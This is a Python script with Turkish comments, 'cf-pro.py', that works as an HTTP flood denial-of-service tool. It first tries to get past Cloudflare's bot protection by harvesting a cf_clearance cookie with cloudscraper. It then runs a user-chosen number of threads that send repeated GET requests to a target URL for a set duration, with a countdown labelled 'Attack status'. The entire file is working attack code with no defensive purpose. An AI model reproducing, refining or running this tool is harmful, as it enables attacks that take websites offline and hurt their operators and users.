#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# cf-pro.py – Sadeleştirilmiş, proxy desteği kaldırıldı, argümanlarla çalışır.

import os
import sys
import threading
import datetime
import time
import random
from sys import stdout
from urllib.parse import urlparse

import requests
import cloudscraper
from requests.cookies import RequestsCookieJar
from colorama import Fore, init

init(convert=True)

# ========== ARGÜMAN KONTROLÜ ==========
if len(sys.argv) < 4:
    print("Kullanım: cf-pro.py <url> <threads> <seconds>")
    sys.exit(1)

target = sys.argv[1]
threads = int(sys.argv[2])
duration = int(sys.argv[3])

# ========== GLOBAL DEĞİŞKENLER ==========
cookieJAR = None
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# ========== CLOUDFLARE BYPASS ==========
def get_cookie(url):
    global cookieJAR, useragent
    try:
        scraper = cloudscraper.create_scraper()
        resp = scraper.get(url, timeout=15)
        if 'cf_clearance' in resp.cookies:
            cookieJAR = {'name': 'cf_clearance', 'value': resp.cookies['cf_clearance']}
            useragent = scraper.headers.get('User-Agent', useragent)
            return True
        else:
            sess = requests.Session()
            resp2 = sess.get(url, timeout=15, headers={'User-Agent': useragent})
            if 'cf_clearance' in resp2.cookies:
                cookieJAR = {'name': 'cf_clearance', 'value': resp2.cookies['cf_clearance']}
                return True
        return False
    except Exception:
        return False

# ========== GERİ SAYIM ==========
def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        kalan = (until - datetime.datetime.now()).total_seconds()
        if kalan > 0:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} Attack status => {kalan:.1f} sec left ")
            time.sleep(0.1)
        else:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} Attack Done | Ctrl + C to exit!                                   \n")
            return

# ========== SALDIRI FONKSİYONU ==========
def launch_attack(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=attack_thread, args=(url, until))
            thd.daemon = True
            thd.start()
        except:
            pass

def attack_thread(url, until_datetime):
    headers = {
        'User-Agent': useragent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    if cookieJAR:
        jar = RequestsCookieJar()
        jar.set(cookieJAR['name'], cookieJAR['value'])
        scraper.cookies = jar

    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False, timeout=5)
            scraper.get(url=url, headers=headers, allow_redirects=False, timeout=5)
        except:
            pass

# ========== ANA ==========
if __name__ == '__main__':
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF...\n")
    if get_cookie(target):
        stdout.write(Fore.GREEN + " [✓] CF bypass başarılı.\n")
    else:
        stdout.write(Fore.RED + " [!] CF bypass başarısız, yine de saldırı devam eder.\n")

    timer = threading.Thread(target=countdown, args=(duration,))
    timer.daemon = True
    timer.start()
    launch_attack(target, threads, duration)
    timer.join()